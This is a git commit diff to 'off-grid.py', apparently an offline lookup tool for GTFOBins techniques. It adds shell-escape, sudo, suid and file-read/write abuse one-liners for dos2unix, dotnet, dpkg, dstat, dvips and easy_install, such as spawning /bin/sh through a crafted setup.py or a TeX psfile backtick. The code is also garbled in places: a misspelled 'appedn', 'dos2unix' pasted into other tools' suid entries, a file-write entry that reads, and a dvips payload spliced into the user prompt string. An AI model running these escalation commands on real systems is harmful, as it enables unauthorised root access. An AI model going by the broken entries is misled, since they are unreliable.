bc751d80492295d45f02dedbd2548e46214f0e27
S14X0r <s1ax0r@tutamail.com>
2024-12-09 23:04:37 -0500

    Add files via upload
    Updated

--- off-grid.py
+++ off-grid.py
@@ -1215,6 +1215,77 @@ def gtfo_bins(zip_command, zip_options):
         elif zip_options == "file-read":
             bins.append("CONTAINER_ID=""$(docker run -d alpine)""  # or existing\nTF=$(mktemp)\ndocker cp file_to_read $CONTAINER_ID:$TF\ndocker cp $CONTAINER_ID:$TF $TF\ncat $TF")
 
+    elif zip_command == "dos2unix":
+        if zip_options == "file-write":
+            bins.append("LFILE1=file_to_read\nLFILE2=file_to_write\ndos2unix -f -n ""$LFILE1"" ""$LFILE2""")
+        elif zip_options == "file-read":
+            bins.append("LFILE2=file_to_read\ndos2unix -f -n ""$LFILE2""")
+        elif zip_options == "sudo":
+            bins.append("LFILE1=file_to_read\nLFILE2=file_to_write\nsudo dos2unix -f -n ""$LFILE1"" ""$LFILE2""")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which dos2unix) .\nLFILE1=file_to_read\nLFILE2=file_to_write\ndos2unix -f -n ""$LFILE1"" ""$LFILE2""")
+        elif zip_options == "Shell":
+            bins.append("dos2unix script.sh")
+
+    elif zip_command == "dotnet":
+        if zip_options == "sudo":
+            bins.append("sudo dotnet fsi\nSystem.Diagnostics.Process.Start(""/bin/sh"").WaitForExit();;")
+        elif zip_options == "Shell":
+            bins.append("dotnet fsi\nSystem.Diagnostics.Process.Start(""/bin/sh"").WaitForExit();;")
+        elif zip_options == "file-read":
+            bins.append("export LFILE=file_to_read\ndotnet fsi\nSystem.IO.File.ReadAllText(System.Environment.GetEnvironmentVariable(""LFILE""));;")
+        elif zip_options == "file-write":
+            bins.append("export LFILE=file_to_write\ndotnet fsi\nSystem.IO.File.ReadAllText(System.Environment.GetEnvironmentVariable(""LFILE""));;")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which dos2unix) .\nsudo dotnet fsi\nSystem.Diagnostics.Process.Start(""/bin/sh"").WaitForExit();;")
+
+    elif zip_command == "dpkg":
+        if zip_options == "sudo":
+            bins.append("sudo dpkg -l\n!/bin/sh")
+        elif zip_options == "Shell":
+            bins.append("dpkg -l\n!/bin/sh")
+        elif zip_options == "file-read":
+            bins.append("dpkg --listfiles <package_name>")
+        elif zip_options == "file-write":
+            bins.append("dpkg-deb -x <package_name>.deb /tmp/package_contents")
+        elif zip_options == "suid":
+            bins.appedn("sudo chmod u+s /usr/bin/dpkg")
+
+    elif zip_command == "dstat":
+        if zip_options == "sudo":
+            bins.append("echo 'import os; os.execv(""/bin/sh"", [""sh""])' >/usr/local/share/dstat/dstat_xxx.py\nsudo dstat --xxx")
+        elif zip_options == "Shell":
+            bins.append("mkdir -p ~/.dstat\necho 'import os; os.execv(""/bin/sh"", [""sh""])' >/usr/local/share/dstat/dstat_xxx.py\nsudo dstat --xxx")
+        elif zip_options == "file-write":
+            bins.append("dstat >> /path/to/output_file.txt")
+        elif zip_options == "file-read":
+            bins.append("cat /path/to/output_file.csv")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which dos2unix) .\necho 'import os; os.execv(""/bin/sh"", [""sh""])' >/usr/local/share/dstat/dstat_xxx.py\nsudo dstat --xxx")
+
+    elif zip_command == "dvips":
+        if zip_options == "sudo":
+            bins.append("tex '\special{psfile=""`/bin/sh 1>&0""}\end'\nsudo dvips -R0 texput.dvi")
+        elif zip_options == "Shell":
+            bins.append("tex '\special{psfile=""`/bin/sh 1>&0""}\end'\ndvips -R0 texput.dvi")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which dvips) .\ntex '\special{psfile=""`/bin/sh 1>&0""}\end'\nsudo dvips -R0 texput.dvi")
+        elif zip_options == "file-read":
+            bins.append("dvips -o output.ps")
+        elif zip_options == "file-write":
+            bins.append("dvips input.dvi -o /path/to/output_directory/filename.ps")
+
+    elif zip_command == "easy_install":
+        if zip_options == "sudo":
+            bins.append("TF=$(mktemp -d)\necho ""import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')"" > $TF/setup.py\nsudo easy_install $TF")
+        elif zip_options == "Shell":
+            bins.append("TF=$(mktemp -d)\necho ""import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')"" > $TF/setup.py\neasy_install $TF")
+        elif zip_options == "file-write":
+            bins.append("export LFILE=/tmp/file_to_save\nTF=$(mktemp -d)\necho ""import os; os.execl('$(whereis python)', 'python', '-c', 'open(\"$LFILE\",\"w+\").write(\"DATA\")')"" > $TF/setup.py\neasy_install $TF")
+        elif zip_options == "file-read":
+            bins.append("TF=$(mktemp -d)\necho 'print(open(""file_to_read"").read())' > $TF/setup.py\neasy_install $TF")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which easy_install) .\nTF=$(mktemp -d)\necho ""import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')"" > $TF/setup.py\nsudo easy_install $TF")
 
 #If there are any other misconfigurations run the other option
     elif zip_command == "other":
@@ -1231,8 +1302,8 @@ def main():
     start = input("Off-Grid, the offline GTFO Bin lookup tool, what is misconfigured?\n")
 
     #Tool selection for Linux misconfigurations
-    if start == "zip" or start == "7zip" or start == "base64" or start == "bash" or start == "awk" or start == "base32" or start == "busybox" or start == "cat" or start == "neofetch" or start == "cp" or start == "curl" or start == "chmod" or start == "dosbox" or start == "dmesg" or start == "gcc" or start == "vim" or start == "vi" or start == "nano" or start == "zsh" or start == "dd" or start == "aa-exec" or start == "ab" or start == "agetty" or start == "alpine" or start == "ansible-playbook" or start == "ansible-test" or start == "aoss" or start == "apache2ctl" or start == "apt-get" or start == "ar" or start == "apt" or start == "aria2c" or start == "arj" or start == "arp" or start == "as" or start == "ascii-xfr" or start == "ascii85" or start == "ash" or start == "aspell" or start == "at" or start == "atobm" or start == "aws" or start == "base58" or start == "basenc" or start == "basez" or start == "batcat" or start == "bc" or start == "bconsole" or start == "bpftrace" or start == "bridge" or start == "bundle" or start == "bundler" or start == "busctl" or start == "byebug" or start == "bzip2" or start == "c89" or start == "c99" or start == "cabal" or start == "cancel" or start == "capsh" or start == "cdist" or start == "certbot" or start == "check_by_ssh" or start == "check_cups" or start == "check_log" or start == "check_memory" or start == "check_raid" or start == "check_ssl_cert" or start == "check_statusfile" or start == "choom" or start == "chown" or start == "chroot" or start == "clamscan" or start == "cmp" or start == "cobc" or start == "column" or start == "comm" or start == "composer" or start == "cowsay" or start == "cowthink" or start == "cpan" or start == "cpio" or start == "cpulimit" or start == "crash" or start == "crontab" or start == "csh" or start == "csvtool" or start == "cupsfilter" or start == "cut" or start == "dash" or start == "date" or start == "dc" or start == "debugfs" or start == "dialog" or start == "diff" or start == "dig" or start == "distcc" or start == "dmidecode" or start == "dmsetup" or start == "dnf" or start == "docker" or start == "other":  
-        zip_options = input("Choose following options: Shell, file-read, file-write, sudo, suid\n")
+    if start == "zip" or start == "7zip" or start == "base64" or start == "bash" or start == "awk" or start == "base32" or start == "busybox" or start == "cat" or start == "neofetch" or start == "cp" or start == "curl" or start == "chmod" or start == "dosbox" or start == "dmesg" or start == "gcc" or start == "vim" or start == "vi" or start == "nano" or start == "zsh" or start == "dd" or start == "aa-exec" or start == "ab" or start == "agetty" or start == "alpine" or start == "ansible-playbook" or start == "ansible-test" or start == "aoss" or start == "apache2ctl" or start == "apt-get" or start == "ar" or start == "apt" or start == "aria2c" or start == "arj" or start == "arp" or start == "as" or start == "ascii-xfr" or start == "ascii85" or start == "ash" or start == "aspell" or start == "at" or start == "atobm" or start == "aws" or start == "base58" or start == "basenc" or start == "basez" or start == "batcat" or start == "bc" or start == "bconsole" or start == "bpftrace" or start == "bridge" or start == "bundle" or start == "bundler" or start == "busctl" or start == "byebug" or start == "bzip2" or start == "c89" or start == "c99" or start == "cabal" or start == "cancel" or start == "capsh" or start == "cdist" or start == "certbot" or start == "check_by_ssh" or start == "check_cups" or start == "check_log" or start == "check_memory" or start == "check_raid" or start == "check_ssl_cert" or start == "check_statusfile" or start == "choom" or start == "chown" or start == "chroot" or start == "clamscan" or start == "cmp" or start == "cobc" or start == "column" or start == "comm" or start == "composer" or start == "cowsay" or start == "cowthink" or start == "cpan" or start == "cpio" or start == "cpulimit" or start == "crash" or start == "crontab" or start == "csh" or start == "csvtool" or start == "cupsfilter" or start == "cut" or start == "dash" or start == "date" or start == "dc" or start == "debugfs" or start == "dialog" or start == "diff" or start == "dig" or start == "distcc" or start == "dmidecode" or start == "dmsetup" or start == "dnf" or start == "docker" or start == "dos2unix" or start == "dotnet" or start == "dpkg" or start == "dstat" or start == "dvips" or start == "dvips" or start == "other":  
+        zip_options = input("Choose tex '\special{psfile=""`/bin/sh 1>&0""}\end'\nsudo dvips -R0 texput.dvifollowing options: Shell, file-read, file-write, sudo, suid\n")
 
         if zip_options in ["Shell", "file-read", "file-write", "sudo", "suid"]:
             bins = gtfo_bins(start, zip_options)  # Call the gtfo_bins function with the correct arguments
